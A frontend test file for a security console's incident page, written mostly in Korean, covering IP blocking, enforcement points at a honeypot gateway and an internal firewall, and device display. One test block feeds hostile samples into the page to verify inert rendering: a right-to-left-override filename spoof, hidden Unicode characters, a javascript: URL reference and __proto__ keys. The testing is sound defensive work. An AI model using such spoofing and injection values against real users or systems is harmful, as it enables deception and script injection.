  it('③ 차단 칸은 관문 불일치 · 집행 제외를 까닭과 함께 보인다', async () => {
    stubApi({ body: detail({ actor: { ...detail().actor, blocked: { ...base, enforce_note: '관문 불일치 · 관문 상태가 7분 전', requested_by: 'triage:han' } } }) })
    renderRoutes(routes(), PATH)
    const actor = within(await screen.findByRole('region', { name: '행위자 이력' }))
    expect(actor.getByText('관문 불일치', { selector: 'span' })).toBeInTheDocument()
    expect(actor.getByText('마지막 집행 확인')).toBeInTheDocument()
    expect(actor.getByText(/^집행 메모/)).toHaveTextContent('집행 메모 관문 불일치 · 관문 상태가 7분 전')
  })

  it('③ 만료 없는 옛 차단은 집행 제외로 보이고 해제는 그대로 된다', async () => {
    stubApi({ role: 'admin', body: detail({ actor: { ...detail().actor, blocked: { ...base, expires_at: null, enforced_at: null, method: null, enforcement: null } } }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    const actor = within(screen.getByRole('region', { name: '행위자 이력' }))
    expect(actor.getByText('집행 제외', { selector: 'span' })).toBeInTheDocument()
    expect(actor.getByText('만료 없는 차단 · 관문 · 내부 방화벽에 넘기지 않음')).toBeInTheDocument()
    expect(panel.getByRole('button', { name: '차단 해제' })).not.toHaveAttribute('aria-disabled')
  })

  it('차단 금지 대역 출발지는 차단 단추를 흐리고 까닭을 보인다', async () => {
    const fetch = stubApi({ body: detail({ actor: { ...detail().actor, blocked: null, exempt: { cidr: '15.164.37.49/32', note: '허니팟 관문 EIP' } } }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    const button = panel.getByRole('button', { name: '차단' })
    expect(button).toHaveAttribute('aria-disabled', 'true')
    fireEvent.click(button)
    expect(panel.queryByRole('form', { name: '차단 확인' })).toBeNull()
    expect(panel.getByText(/^차단 금지 대역 15\.164\.37\.49\/32\(허니팟 관문 EIP\)에 들어 차단할 수 없습니다/, { selector: 'p' })).toHaveTextContent(/^차단 금지 대역 15\.164\.37\.49\/32\(허니팟 관문 EIP\)에 들어 차단할 수 없습니다\. /)
    expect(panel.getByRole('button', { name: '차단 금지 대역 설명' })).toHaveAccessibleDescription('인프라 · 사설 · 예약 주소는 막지 않습니다.')
    const actor = screen.getByRole('region', { name: '행위자 이력' })
    expect(actor.querySelector('[data-block-exempt]')).toHaveTextContent('차단 금지 대역 15.164.37.49/32(허니팟 관문 EIP) · 이 출발지는 차단하지 않습니다')
    expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toBeUndefined()
  })

  it('서버가 금지 대역으로 거부하면(400) 까닭을 그대로 보이고 성공으로 표시하지 않는다', async () => {
    const detailText = '4.4.66.84 는 차단 금지 대역 4.4.66.0/24(시험)에 들어 차단하지 않습니다. 인프라 · 사설 · 예약 주소는 막지 않습니다'
    stubApi({ actionError: { status: 400, detail: detailText } })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    fireEvent.click(within(panel.getByRole('form', { name: '차단 확인' })).getByRole('button', { name: '차단 확정' }))
    expect(await panel.findByRole('alert')).toHaveTextContent(`조치를 기록하지 못했습니다 · ${detailText} (HTTP 400)`)
    expect(panel.queryByText(/조치를 기록했습니다/)).toBeNull()
  })

  it('만료 없는 옛 차단이 살아 있으면 차단 확인이 몇 시간 차단이라 하지 않고 집행 제외로 남는다고 알린다', async () => {
    stubApi({ body: detail({ actor: { ...detail().actor, blocked: { ...base, expires_at: null, enforced_at: null, method: null, enforce_note: '집행 제외 · 만료 없음' } } }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    const box = panel.getByRole('form', { name: '차단 확인' })
    const form = within(box)
    const sentence = box.querySelector('p') as HTMLElement
    // 집행 제외는 두 지점(허니팟 관문 · 내부 방화벽) 모두에서 빠진다(#72)
    expect(sentence).toHaveTextContent(/^출발지 4\.4\.66\.84 에는 만료 없는 옛 차단이 살아 있어 두 지점 집행에서 빠집니다\(집행 제외\)\. 이 요청은 사유 · 요청자만 바꿉니다\. 지점에서 막으려면 admin 이 해제한 뒤 다시 차단합니다\./)
    // 만료 칸이 보여도 이 요청이 무엇을 바꾸는지(요청의 효과)는 ⓘ 가 아니라 본문에 있다
    expect(form.getByText(/이 요청은 사유 · 요청자만 바꿉니다/).closest('[data-infotip]')).toBeNull()
    expect(form.getByRole('button', { name: '옛 차단 설명' })).toHaveAccessibleDescription('살아 있는 차단의 만료는 앞당기지 않아, 다시 걸어도 만료가 그대로 없습니다.')
    expect(sentence).not.toHaveTextContent('동안 차단합니다')
    expect(form.queryByText(/지점별로 확인합니다/)).toBeNull()
  })

  it('차단 확인은 적용 대상 두 지점과 지점별 확인을 알린다', async () => {
    stubApi()
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    const box = panel.getByRole('form', { name: '차단 확인' })
    const form = within(box)
    const sentence = box.querySelector('p') as HTMLElement
    expect(sentence).toHaveTextContent(/^출발지 4\.4\.66\.84 를 1일 \(24시간\) 동안 차단합니다\./)
    expect(sentence).not.toHaveTextContent('만료되면 저절로 풀립니다')
    // 처리 과정 · 예외는 문장 끝 도움말. 살아 있는 차단이 있으면 만료를 앞당기지 않는다는 예외도 거기 있다
    expect(form.getByRole('button', { name: '차단 설명' })).toHaveAccessibleDescription('이미 살아 있는 차단이 있으면 만료를 앞당기지 않습니다. 적용 대상: 허니팟 관문 · web-01 앞 내부 방화벽. 실제 적용 결과는 지점별로 확인합니다.')
  })

  it('후속 차단은 첫 사건 판정이 위협이 아니면 멈춤 · 판정 전이면 대기로 보인다', async () => {
    for (const [verdict, text, tone] of [['false_positive', '후속 차단 멈춤 · 첫 사건의 마지막 판정이 위협이 아닙니다', 'text-warning'], [null, '후속 차단 대기 · 첫 사건에 위협 판정이 없습니다', 'text-warning'], ['threat', /^후속 차단 중 · /, 'text-ink-muted']] as const) {
      stubApi({ body: detail({ absorbed: absorbed({ follow: { expires_at: '2026-09-19T07:00:00+00:00', requested_by: 'han', verdict } }) }) })
      const { unmount } = renderRoutes(routes(), PATH)
      const actor = within(await screen.findByRole('region', { name: '행위자 이력' }))
      expect(actor.getByText(text)).toHaveClass(tone)
      // 다시 위협으로 판정하면 이어진다는 조건 · 만료는 도움말에
      expect(actor.getByRole('button', { name: '같은 페이로드 흡수 설명' })).toHaveAccessibleDescription(/첫 사건의 마지막 판정이 위협이면 새로 흡수되는 출발지도 2026-09-19 16:00:00 까지 차단합니다/)
      unmount()
      vi.unstubAllGlobals()
    }
  })
})

describe('IncidentDetailPage · 차단 적용 지점(#77)', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
  })

  const COWRIE: IncidentDevice = { id: 'aws-sensor', part: 'cowrie', label: 'SSH 허니팟(Cowrie)', group: 'sensor', logs: ['SSH 세션'], basis: 'confirmed' }
  const WEB: IncidentDevice = { id: 'web-01', part: null, label: 'web-01', group: 'protected', logs: ['웹 접근'], basis: 'confirmed' }
  const CONSOLE: IncidentDevice = { id: 'console', part: null, label: '관제 콘솔', group: 'monitor', logs: ['콘솔 감사'], basis: 'confirmed' }
  const DATA: IncidentDevice = { id: 'data-node', part: null, label: '데이터 노드', group: 'monitor', logs: ['감사'], basis: 'rule_scope' }
  /** 살아 있는 차단 없음 · 내부 방화벽 기본(서버 block_points: 규칙만으로 정한 기본값 · 까닭 · 살아 있는 요청) */
  const SENSOR_ONLY: BlockPointsInfo = { default: ['fw'], basis: 'sensor_only', requested: null }
  const noBlock = { ...detail().actor, blocked: null }

  async function openBlock() {
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    const box = panel.getByRole('form', { name: '차단 확인' })
    return { panel, form: within(box), group: within(within(box).getByRole('group', { name: '적용 지점' })) }
  }

  const CASES: Array<[string, Partial<IncidentDetail>, BlockPointsInfo, boolean, RegExp]> = [
    ['Cowrie 에서만 본 사건 → 내부 방화벽', { rule_id: 'R001', devices: [COWRIE], device_state: 'confirmed' }, SENSOR_ONLY, false, /^허니팟 센서에서만 본 위협이라 관측이 이어지게 기본은 내부 방화벽만입니다\. 허니팟 자원 소모 · 침해 의심이면 관문을 더합니다\.$/],
    ['허니팟 남용(R004) → 관문 + 내부 방화벽', { rule_id: 'R004', devices: [COWRIE], device_state: 'confirmed' }, { default: ['gateway', 'fw'], basis: 'honeypot_abuse', requested: null }, true, /^허니팟 남용 규칙\(프록시 남용 시도\)이라 기본으로 관문에서도 막습니다\.$/],
    ['web-01 사건 → 내부 방화벽', { rule_id: 'R102', devices: [WEB], device_state: 'confirmed' }, { default: ['fw'], basis: 'protected', requested: null }, false, /^보호 대상에서 본 위협이라 기본은 내부 방화벽입니다\.$/],
    ['관제 콘솔 · 데이터 노드 사건 → 내부 방화벽', { rule_id: 'R201', devices: [CONSOLE, DATA], device_state: 'confirmed' }, { default: ['fw'], basis: 'monitor', requested: null }, false, /^관제 시스템\(콘솔 · 데이터 노드\)에서 본 위협이라 기본은 내부 방화벽입니다\.$/],
  ]

  it.each(CASES)('확인 창 기본값: %s', async (_name, extra, points, gateway, tip) => {
    stubApi({ body: detail({ ...extra, actor: noBlock, block_points: points }) })
    renderRoutes(routes(), PATH)
    const { form, group } = await openBlock()
    // 내부 방화벽은 늘 막는다(고정). 관문은 확인란 하나
    const fw = group.getByRole('checkbox', { name: '내부 방화벽 · 늘 적용' })
    expect(fw).toBeChecked()
    expect(fw).toBeDisabled()
    const check = group.getByRole('checkbox', { name: '허니팟 관문에서도 막기' })
    expect((check as HTMLInputElement).checked).toBe(gateway)
    expect(check).toBeEnabled()
    // 기본값의 까닭은 확인란 옆 ⓘ 한 줄
    expect(group.getByRole('button', { name: '허니팟 관문에서도 막기 설명' })).toHaveAccessibleDescription(tip)
    // 관문에서도 막으면 경고 한 줄(허니팟 관측이 끊긴다, 주의색). 내부 방화벽만이면 없다
    expect(group.queryByText('허니팟 관측이 끊깁니다.')?.classList.contains('text-warning') ?? false).toBe(gateway)
    // 적용 대상 두 지점을 늘어놓던 문장은 묶음이 대신한다
    expect(form.getByRole('button', { name: '차단 설명' })).toHaveAccessibleDescription('실제 적용 결과는 지점별로 확인합니다.')
  })

  it('기본값 그대로 보내면 내부 방화벽만, 관문을 더하면 경고 한 줄과 두 지점이 가고, 다시 열면 기본값이다', async () => {
    const fetch = stubApi({ body: detail({ actor: noBlock, block_points: SENSOR_ONLY }) })
    renderRoutes(routes(), PATH)
    const first = await openBlock()
    fireEvent.click(first.form.getByRole('button', { name: '차단 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ expected_version: '0:0', action: 'block_ip', expires_hours: 24, points: ['fw'] }))
    expect(await first.panel.findByText('차단 조치를 기록했습니다')).toBeInTheDocument()

    fetch.mockClear()
    const { panel, form, group } = await openBlock()
    const check = group.getByRole('checkbox', { name: '허니팟 관문에서도 막기' })
    expect(check).not.toBeChecked()
    fireEvent.click(check)
    expect(check).toBeChecked()
    expect(check).toHaveAccessibleDescription(/^허니팟 관측이 끊깁니다\. 허니팟 센서에서만 본 위협이라/)
    fireEvent.click(form.getByRole('button', { name: '차단 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ expected_version: '0:0', action: 'block_ip', expires_hours: 24, points: ['gateway', 'fw'] }))
    expect(await panel.findByText('차단 조치를 기록했습니다')).toBeInTheDocument()
    // 다시 열면 고른 것은 사라지고 기본값(내부 방화벽만)이다
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    expect(within(panel.getByRole('group', { name: '적용 지점' })).getByRole('checkbox', { name: '허니팟 관문에서도 막기' })).not.toBeChecked()
  })

  it('살아 있는 차단이 관문을 요청했으면 체크한 채 잠그고, admin 은 풀 수 있으며 풀면 해제 뒤 다시 걸기로 기록된다고 알린다', async () => {
    const live: BlockPointsInfo = { default: ['fw'], basis: 'sensor_only', requested: ['gateway', 'fw'] }
    stubApi({ body: detail({ block_points: live }) })
    const view = renderRoutes(routes(), PATH)
    const operator = await openBlock()
    const locked = operator.group.getByRole('checkbox', { name: '허니팟 관문에서도 막기' })
    expect(locked).toBeChecked()
    expect(locked).toBeDisabled()
    expect(locked).toHaveAccessibleDescription(/^살아 있는 차단이 관문도 막고 있어 admin 만 뺄 수 있습니다\./)
    // 이미 관문에서 막고 있어 관측이 끊긴다는 경고는 되풀이하지 않는다
    expect(operator.group.queryByText('허니팟 관측이 끊깁니다.')).toBeNull()
    view.unmount()
    vi.unstubAllGlobals()

    const fetch = stubApi({ role: 'admin', body: detail({ block_points: live }) })
    renderRoutes(routes(), PATH)
    const { form, group } = await openBlock()
    const check = group.getByRole('checkbox', { name: '허니팟 관문에서도 막기' })
    expect(check).toBeChecked()
    expect(check).toBeEnabled()
    expect(group.queryByText('해제 뒤 다시 걸기로 기록됩니다.')).toBeNull()
    fireEvent.click(check)
    expect(group.getByText('해제 뒤 다시 걸기로 기록됩니다.')).toHaveClass('text-warning')
    fireEvent.click(form.getByRole('button', { name: '차단 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ expected_version: '0:0', action: 'block_ip', expires_hours: 24, points: ['fw'] }))
  })

  it('만료 없는 옛 차단에서 admin 이 관문을 빼면 적용 지점도 바뀐다고 본문에 적는다', async () => {
    const legacy = { ...detail().actor.blocked!, expires_at: null, enforced_at: null, method: null, enforce_note: '집행 제외 · 만료 없음' }
    stubApi({ role: 'admin', body: detail({ actor: { ...detail().actor, blocked: legacy }, block_points: { default: ['fw'], basis: 'sensor_only', requested: ['gateway', 'fw'] } }) })
    renderRoutes(routes(), PATH)
    const { form, group } = await openBlock()
    expect(form.getByText(/이 요청은 사유 · 요청자만 바꿉니다/)).toBeInTheDocument()
    fireEvent.click(group.getByRole('checkbox', { name: '허니팟 관문에서도 막기' }))
    expect(form.getByText(/이 요청은 사유 · 요청자 · 적용 지점만 바꿉니다/)).toBeInTheDocument()
  })

  it('내부 방화벽만 건 살아 있는 차단은 ③ 관문 칸이 미요청이고, operator 도 관문을 더해 넓힐 수 있다', async () => {
    const fwOnly = { ...detail().actor.blocked!, points: ['fw' as const], method: null, enforced_at: null }
    const fetch = stubApi({ body: detail({ actor: { ...detail().actor, blocked: fwOnly }, block_points: { ...SENSOR_ONLY, requested: ['fw'] } }) })
    renderRoutes(routes(), PATH)
    const actor = within(await screen.findByRole('region', { name: '행위자 이력' }))
    // 요청한 지점(내부 방화벽)이 확인이라 집행 확인이다. 관문 칸은 미확인 · 실패가 아니라 미요청
    expect(actor.getByText('집행 확인', { selector: 'span' })).toBeInTheDocument()
    expect(actor.getByText('내부 방화벽 반영 확인')).toBeInTheDocument()
    const list = actor.getByRole('list', { name: '집행 지점별 결과' })
    expect([...list.querySelectorAll('[data-enforce-point]')].map((el) => [el.getAttribute('data-enforce-point'), el.getAttribute('data-point-state')])).toEqual([['gateway', 'unrequested'], ['fw', 'confirmed']])
    expect(list.querySelector('[data-enforce-point="gateway"]')).toHaveTextContent(/^허니팟 관문미요청$/)

    const { form, group } = await openBlock()
    const check = group.getByRole('checkbox', { name: '허니팟 관문에서도 막기' })
    expect(check).not.toBeChecked()
    expect(check).toBeEnabled()
    fireEvent.click(check)
    expect(group.getByText('허니팟 관측이 끊깁니다.')).toBeInTheDocument()
    fireEvent.click(form.getByRole('button', { name: '차단 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ expected_version: '0:0', action: 'block_ip', expires_hours: 24, points: ['gateway', 'fw'] }))
  })

  it('관리자가 관문을 뺀 차단은 관문이 뺐다고 확인될 때까지 ③ 관문 칸이 빠짐 확인 전이다(#77 결정 14)', async () => {
    const since = '2026-09-18T07:10:00+00:00'
    const narrowed = { ...detail().actor.blocked!, points: ['fw' as const], enforce_note: '관문 반영 · abcd1234 · x',
      enforcement: { gateway: { state: 'removing' as const, since, mode: 'nft', note: null }, fw: { state: 'confirmed' as const, since: '2026-09-18T07:00:20+00:00', mode: 'nft', note: null } } }
    stubApi({ body: detail({ actor: { ...detail().actor, blocked: narrowed }, block_points: { ...SENSOR_ONLY, requested: ['fw'] } }) })
    renderRoutes(routes(), PATH)
    const actor = within(await screen.findByRole('region', { name: '행위자 이력' }))
    // 요청한 지점(내부 방화벽)이 확인이라 집행 확인이다. 관문 칸은 미요청이 아니라 빠짐 확인 전이고 관문 확인 시각은 보이지 않는다
    expect(actor.getByText('집행 확인', { selector: 'span' })).toBeInTheDocument()
    expect(actor.getByText('내부 방화벽 반영 확인 · 관문에서 빠졌는지 확인 전')).toBeInTheDocument()
    const list = actor.getByRole('list', { name: '집행 지점별 결과' })
    expect([...list.querySelectorAll('[data-enforce-point]')].map((el) => [el.getAttribute('data-enforce-point'), el.getAttribute('data-point-state')])).toEqual([['gateway', 'removing'], ['fw', 'confirmed']])
    expect(list.querySelector('[data-enforce-point="gateway"]')).toHaveTextContent(/^허니팟 관문빠짐 확인 전/)
  })

  it('흡수된 출발지를 함께 차단하면 같은 지점이 간다(흡수 차단 · 후속 차단 약속도 같은 지점)', async () => {
    const fetch = stubApi({ body: detail({ rule_id: 'R006', absorbed: absorbed(), actor: noBlock, block_points: SENSOR_ONLY }) })
    renderRoutes(routes(), PATH)
    const { form, group } = await openBlock()
    expect(form.getByRole('button', { name: '흡수된 출발지 2곳도 함께 차단 설명' })).toHaveAccessibleDescription(/적용 지점은 이 출발지와 같고, 살아 있는 차단은 넓히기만 합니다\.$/)
    fireEvent.click(form.getByRole('checkbox', { name: '흡수된 출발지 2곳도 함께 차단' }))
    fireEvent.click(group.getByRole('checkbox', { name: '허니팟 관문에서도 막기' }))
    fireEvent.click(form.getByRole('button', { name: '차단 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ expected_version: '0:0', action: 'block_ip', expires_hours: 24, include_absorbed: true, points: ['gateway', 'fw'] }))
  })
})

describe('IncidentDetailPage · 비신뢰 문자열(#41)', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
  })

  it('악성 표본을 글자로만 그리고 숨은 문자는 표식 · 줄바꿈은 ↵ 로 보이며 2만 자는 접는다', async () => {
    stubApi({ body: hostileDetail(), cti: hostileCti() })
    const { container } = renderRoutes(routes(), PATH, noRetryClient())
    await screen.findByRole('region', { name: '취약점 연계' })
    await readyPanel()
    // 종결 사건이라 접힌 재판정 폼(도구 제안 포함)을 펴고 본다(#94)
    fireEvent.click(screen.getByRole('button', { name: '재판정' }))
    const raw = screen.getByRole('region', { name: '원문 로그' })
    fireEvent.click(within(raw).getByRole('button', { name: '펼치기' }))

    expectInertDom(container)
    expectMixedRevealed(container)

    // 사건 머리: 대상은 표식으로, 한 칸 안에서 격리된다
    const target = screen.getByText('대상', { selector: 'dt' }).nextElementSibling as HTMLElement
    expect(target.textContent).toBe(`user:${revealHidden(MIXED)}`)
    expect(target.querySelector('bdi')).toHaveAttribute('dir', 'ltr')

    // ④ 원문: 한 사건 줄은 li 하나(가짜 줄 없음) · 필드마다 따로 격리 · 필드 사이 공백 두 칸
    const lines = within(within(raw).getByRole('list', { name: '원문 로그 줄' })).getAllByRole('listitem')
    expect(lines).toHaveLength(2)
    expect(lines[0].querySelectorAll('bdi').length).toBeGreaterThanOrEqual(9)
    expect(lines[0].textContent).toContain('  user=admin⟨U+202E⟩gnp.exe  password=[있음]  input=')
    expect(lines[0].textContent).toMatch(/줄1↵2026-09-18 15:00:00 decoy login\.success$/)

    // ① 표본: 공격자 키도 머리글에서 표식 · 글자로 보인다 · 긴 세션 칩은 접힌다
    const evidence = screen.getByRole('region', { name: '규칙이 본 것' })
    const heads = within(evidence).getAllByRole('columnheader').map((th) => th.textContent)
    expect(heads).toContain('admin⟨U+202E⟩gnp.exe')
    expect(heads).toContain(HOSTILE.img)
    expect(within(evidence).getByRole('button', { name: '… 19,936자 더 · 펼치기' })).toBeInTheDocument()

    // ③ 흡수 페이로드: 말풍선도 표식으로
    const actor = screen.getByRole('region', { name: '행위자 이력' })
    expect(within(actor).getByTitle(revealHidden(`${HOSTILE.rlo}${HOSTILE.img}`))).toBeInTheDocument()

    // ⑤ 이력 · 판정 패널: 행위자 이름 표식
    const history = screen.getByRole('table', { name: '판정 · 조치 이력' })
    const actionRow = history.querySelector('[data-history-kind="action"]') as HTMLElement
    expect(within(actionRow).getAllByRole('cell')[3].textContent).toBe('ad⟨U+200B⟩min')
    expect(screen.getByLabelText('도구 제안')).toHaveTextContent('⟨U+202E⟩')

    // ⑥ 취약점 연계: 요약 말풍선 · 표 이름도 표식으로
    const vuln = screen.getByRole('region', { name: '취약점 연계' })
    expect(within(vuln).getByTitle(revealHidden(MIXED))).toBeInTheDocument()
    expect(within(vuln).getByRole('table', { name: `${revealHidden(MIXED)} 자산 적용` })).toBeInTheDocument()

    // 2만 자: 원문 · 행위 · 표본 값 · 조치 메모 · 서명 근거가 접혀 있다가 펼치면 전부 보인다
    expectLongFolds(container)
  })

  it('공개 규칙 출처 값이 악성이어도 글자로만 그리고, SigmaHQ 주소가 아니면 원본 위치를 링크로 만들지 않는다(#54)', async () => {
    const hostile = sigmaSource({ title: MIXED, id: HOSTILE.rlo, author: HOSTILE.img, level: HOSTILE.zwsp, url: `${HOSTILE.jsUrl} ${HOSTILE.bom}`, notes: [MIXED, LONG] })
    stubApi({ cti: ctiFor({ signatures: [sigmaSignature({ sigma: hostile })] }) })
    renderRoutes(routes(), PATH, noRetryClient())
    const vuln = await screen.findByRole('region', { name: '취약점 연계' })
    const source = vuln.querySelector('[data-sigma-source]') as HTMLElement
    expect(source.querySelectorAll('a')).toHaveLength(0)
    expect(source.textContent).toContain(`원본 위치 ${HOSTILE.jsUrl} ⟨U+FEFF⟩`)
    // 제목은 200자에서 접힌다(원본 제목은 짧다). 앞부분은 글자 그대로 보인다
    expect(source.textContent).toContain(`원본 규칙: ${HOSTILE.img} ${HOSTILE.svg}`)
    expect(source.textContent).toContain('ad⟨U+200B⟩min')
    expectInertDom(vuln)
    expectMixedRevealed(vuln)
    expectLongFolds(vuln)
  })

  it('주소로 받은 사건 키가 악성이어도 404 화면에 글자로만 보인다', async () => {
    stubApi()
    const key = `R201|v2|user:${MIXED}|2026-09-18T06:00:00+00:00`
    const { container } = renderRoutes(routes(), `/incidents/${encodeURIComponent(key)}`, noRetryClient())
    expect(await screen.findByText('인시던트를 찾을 수 없습니다')).toBeInTheDocument()
    expectInertDom(container)
    expectMixedRevealed(container)
    expect(container.textContent).toContain(revealHidden(key))
  })

  it('표본 키가 __proto__ · constructor 여도 없는 칸은 물려받은 값이 아니라 빈 칸 표시(—)다', async () => {
    // JSON.parse 로 만들어야 __proto__ 가 제 키로 남는다(서버 응답과 같다)
    const sample = JSON.parse('[{"__proto__": "p", "constructor": "c", "url": "x"}, {"url": "y"}]') as EvidenceSample[]
    stubApi({ body: detail({ evidence: { sample, sessions: [], observed_count_max: 3 } }) })
    renderRoutes(routes(), PATH, noRetryClient())
    const table = await screen.findByRole('table', { name: '규칙이 남긴 표본' })
    expect(within(table).getAllByRole('columnheader').map((th) => th.textContent)).toEqual(['__proto__', 'constructor', 'url'])
    const [, first, second] = within(table).getAllByRole('row')
    expect(within(first).getAllByRole('cell').map((td) => td.textContent)).toEqual(['p', 'c', 'x'])
    expect(within(second).getAllByRole('cell').map((td) => td.textContent)).toEqual(['—', '—', 'y'])
  })
})

// ---------------------------------------------------------------- #72 관련 장비

describe('IncidentDetailPage · 관련 장비(#72)', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
  })

  const WEB: IncidentDevice = { id: 'web-01', part: null, label: 'web-01', group: 'protected', logs: ['웹 접근'], basis: 'confirmed' }
  const SENSOR: IncidentDevice = { id: 'aws-sensor', part: null, label: '허니팟 센서', group: 'sensor', logs: ['세션 기록'], basis: 'rule_scope' }
  const COWRIE: IncidentDevice = { id: 'aws-sensor', part: 'cowrie', label: 'SSH 허니팟(Cowrie)', group: 'sensor', logs: ['SSH 세션'], basis: 'fallback' }
  const NOTE = '기존 근거(대상 열 · 근거 발생원 · 탐지와 같은 범위의 이벤트)로 조회 때 계산합니다. 로그 삭제나 매핑 기준이 바뀌면 달라질 수 있습니다.'

  /** 머리의 '장비' 항목 값(dt 다음 dd) */
  async function deviceItem(): Promise<HTMLElement> {
    const dt = await screen.findByText('장비', { selector: 'dt' })
    const dd = dt.nextElementSibling as HTMLElement
    expect(dd.tagName).toBe('DD')
    return dd
  }

  it('장비 항목은 배지(보호 대상 먼저)와 근거 글자를 보이고, 계산 방식은 장비 옆 ⓘ 에 둔다', async () => {
    stubApi({ body: detail({ devices: [SENSOR, WEB], device_state: 'confirmed', device_fallback: [] }) })
    renderRoutes(routes(), PATH)
    const dd = await deviceItem()
    expect([...dd.querySelectorAll('[data-device]')].map((el) => [el.getAttribute('data-device'), el.getAttribute('data-device-basis')])).toEqual([['web-01', 'confirmed'], ['aws-sensor', 'rule_scope']])
    expect(dd.querySelector('[data-device="web-01"]')).toHaveTextContent('web-01 · 웹 접근')
    expect(dd.querySelector('[data-device="web-01"]')?.nextElementSibling).toHaveTextContent('확인')
    expect(dd.querySelector('[data-device="aws-sensor"]')?.nextElementSibling).toHaveTextContent('규칙 범위')
    // 확인된 보호 대상만 최근 로그를 새 탭으로 연다(판정 소요 시간이 다시 시작되지 않게, #73)
    const logs = within(dd).getByRole('link', { name: '최근 로그 (새 탭)' })
    expect(logs).toHaveAttribute('href', '/devices/web-01/logs')
    expect(logs).toHaveAttribute('target', '_blank')
    expect(logs).toHaveAttribute('rel', 'noopener noreferrer')
    expect(within(dd).getAllByRole('link')).toHaveLength(1)
    const tip = screen.getByRole('button', { name: '장비 설명' })
    expect(tip.closest('dt')).not.toBeNull()
    expect(tip).toHaveAccessibleDescription(NOTE)
    expect(tipPanel(tip)).not.toHaveTextContent('규칙상')
    // 수집 정보의 발생원(규칙 번호 분류)은 그대로 둔다
    expect(screen.getByText('발생원 허니팟')).toBeInTheDocument()
  })

  it('대체 추정만 있으면 배지는 장비 미확인이고, 추정 장비 이름은 ⓘ 문장에만 있다', async () => {
    stubApi({ body: detail({ rule_id: 'R005', rule_name: '기준선 이탈', devices: [], device_state: 'unconfirmed', device_fallback: [COWRIE] }) })
    renderRoutes(routes(), PATH)
    const dd = await deviceItem()
    const badge = dd.querySelector('[data-device-unknown]') as HTMLElement
    expect(badge).toHaveTextContent('장비 미확인')
    expect(badge.parentElement).not.toHaveTextContent('Cowrie')
    expect(dd.querySelector('[data-device]')).toBeNull()
    const tip = screen.getByRole('button', { name: '장비 설명' })
    expect(tip).toHaveAccessibleDescription(`${NOTE} 이벤트로 장비를 고르지 못했습니다. 규칙상 SSH 허니팟(Cowrie) 일 수 있으나 확인하지 않았습니다.`)
  })

  it('규칙 범위 장비가 있으면 대체 추정은 문장으로도 적지 않는다(세션을 고르지 못한 R002)', async () => {
    stubApi({ body: detail({ rule_id: 'R002', rule_name: '세션', devices: [SENSOR], device_state: 'rule_scope', device_fallback: [COWRIE] }) })
    renderRoutes(routes(), PATH)
    const dd = await deviceItem()
    expect(dd.querySelector('[data-device="aws-sensor"]')).toHaveTextContent('허니팟 센서 · 세션 기록')
    expect(dd.querySelector('[data-device-unknown]')).toBeNull()
    expect(screen.getByRole('button', { name: '장비 설명' })).toHaveAccessibleDescription(NOTE)
  })

  it('추정 장비가 등록 노드면 이름(hostname)을 비신뢰 글자로 그린다', async () => {
    const guessed: IncidentDevice[] = [{ ...WEB, basis: 'fallback' }, { id: 'web-02', part: null, label: MIXED, group: 'protected', logs: ['SSH 인증'], basis: 'fallback' }]
    stubApi({ body: detail({ rule_id: 'R101', devices: [], device_state: 'unconfirmed', device_fallback: guessed }) })
    const { container } = renderRoutes(routes(), PATH)
    await deviceItem()
    const panel = tipPanel(screen.getByRole('button', { name: '장비 설명' }))
    expect(panel.textContent).toContain(`규칙상 web-01 · ${revealHidden(MIXED)} 일 수 있으나 확인하지 않았습니다.`)
    expectInertDom(container)
    expectMixedRevealed(panel)
  })

  it('이전 서버(devices 없음)는 장비 항목을 두지 않는다', async () => {
    stubApi()
    renderRoutes(routes(), PATH)
    expect(await screen.findByRole('heading', { level: 1, name: 'R003 악성코드 투하' })).toBeInTheDocument()
    expect(screen.queryByText('장비', { selector: 'dt' })).toBeNull()
    expect(screen.queryByRole('button', { name: '장비 설명' })).toBeNull()
  })
})
